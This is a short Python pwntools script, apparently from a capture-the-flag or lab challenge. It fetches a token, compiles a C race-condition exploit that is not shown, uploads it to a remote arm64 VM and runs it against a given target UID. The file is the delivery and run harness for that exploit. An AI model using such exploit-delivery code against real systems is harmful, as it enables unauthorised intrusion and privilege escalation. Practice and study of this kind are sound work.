#!/usr/bin/env python3
import sys, re
from pwn import *

from utils import get_new_token, start_vm, compile_exploit, upload_exploit, command_output

def main(target_ip: str, target_uid: str):
    token = get_new_token(target_ip)
    log.info("Got token from token server: %s", token)

    compile_exploit('./exploit_race_cond.c', '/tmp/exploit_race_cond', ['-O0', '-lpthread'])

    r = start_vm(target_ip, token, 'arm64')

    upload_exploit(r, exploit_bin_path='/tmp/exploit_race_cond', remote_bin_path='~/exploit_race_cond')

    output = command_output(r, f'~/exploit_race_cond {target_uid}').decode()
    
    for l in output.splitlines():
        # skip prompt with ansi shit
        if '@ic3-bookworm-arm64:' not in l:
            print(l)

    r.close()

def usage():
    print("Usage: python3 exploit_race_cond.py TARGET_IP TARGET_UID [optional: TOKENSERVER=token_server_ip]")
    sys.exit(1)

if __name__ == '__main__':
    if len(sys.argv) != 3:
        usage()
    main(sys.argv[1], sys.argv[2])